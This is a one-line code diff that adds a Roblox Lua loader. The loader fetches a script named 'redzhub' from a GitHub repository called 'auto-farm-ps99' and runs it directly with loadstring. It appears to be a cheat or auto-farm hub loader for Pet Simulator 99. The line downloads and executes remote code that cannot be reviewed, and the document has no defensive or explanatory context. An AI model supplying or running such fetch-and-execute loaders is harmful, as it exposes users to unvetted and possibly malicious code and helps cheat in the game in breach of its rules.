@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KolorowyXD/auto-farm-ps99/refs/heads/main/redzhub"))() 
